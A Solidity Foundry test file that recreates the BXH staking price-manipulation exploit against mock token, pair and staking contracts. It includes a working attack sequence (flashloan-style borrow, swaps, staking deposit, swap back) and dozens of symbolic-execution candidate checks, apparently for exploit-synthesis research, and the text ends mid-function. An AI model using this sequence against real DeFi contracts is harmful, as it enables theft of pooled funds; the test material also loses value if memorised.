// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./BXH.sol";
import "./BXHStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BXHTest is Test, BlockLoader {
    BXH bxh;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    BXHStaking bxhstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bxhAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address bxhstakingAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1664374995;
    uint112 reserve0pair = 25147468936549224419158;
    uint112 reserve1pair = 150042582869434191452532;
    uint32 blockTimestampLastpair = 1664360756;
    uint256 kLastpair = 3772859961506335396254991567849051167345332565;
    uint256 price0CumulativeLastpair =
        1658542015723059495128658895585784161862152;
    uint256 price1CumulativeLastpair =
        32126006449291447357830235525583796774104;
    uint256 totalSupplybxh = 124962294544563937586572816;
    uint256 balanceOfbxhpair = 150042582869434191452532;
    uint256 balanceOfbxhattacker = 0;
    uint256 balanceOfbxhbxhstaking = 0;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 25147468936549224419158;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtbxhstaking = 40030764994324038311630;

    function setUp() public {
        owner = address(this);
        bxh = new BXH();
        bxhAddr = address(bxh);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(bxh),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        bxhstaking = new BXHStaking(
            address(bxh),
            1 ether,
            21543000,
            1000,
            owner
        );
        bxhstakingAddr = address(bxhstaking);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bxh.transfer(address(pair), balanceOfbxhpair);
        usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
        bxh.transfer(address(bxhstaking), 200000 ether);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bxh Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(bxh), usdt.decimals());
        queryERC20BalanceDecimals(address(bxh), address(bxh), bxh.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(usdt), bxh.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
        emit log_string("");
        emit log_string("Bxhstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(bxhstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(bxhstaking),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(attackContract),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_owner_bxh(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_bxh(uint256 amount) internal {
        bxh.transfer(owner, amount);
    }

    function borrow_pair_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdt(uint256 amount) internal {
        usdt.transfer(address(pair), amount);
    }

    function borrow_pair_bxh(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_bxh(uint256 amount) internal {
        bxh.transfer(address(pair), amount);
    }

    function swap_pair_usdt_bxh(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(bxh);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_bxh_usdt(uint256 amount) internal {
        bxh.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(bxh);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function transaction_bxhstaking_bxh(uint256 amount) internal {
        bxhstaking.deposit(0, amount, address(pair));
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_usdt(3110000e18);
        printBalance("After step0 ");
        swap_pair_usdt_bxh(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        transaction_bxhstaking_bxh(0);
        printBalance("After step2 ");
        swap_pair_bxh_usdt(bxh.balanceOf(attacker));
        printBalance("After step3 ");
        payback_owner_usdt((3110000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        swap_pair_usdt_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        swap_pair_bxh_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        swap_pair_bxh_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        swap_pair_usdt_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        swap_pair_bxh_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        swap_pair_bxh_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        swap_pair_usdt_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        swap_pair_usdt_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand016(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand017(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand018(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand019(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand020(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        swap_pair_usdt_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        swap_pair_bxh_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        borrow_owner_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        borrow_owner_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        swap_pair_bxh_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        swap_pair_usdt_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        transaction_bxhstaking_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        swap_pair_bxh_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        swap_pair_bxh_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_bxh(amt0);
        borrow_owner_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
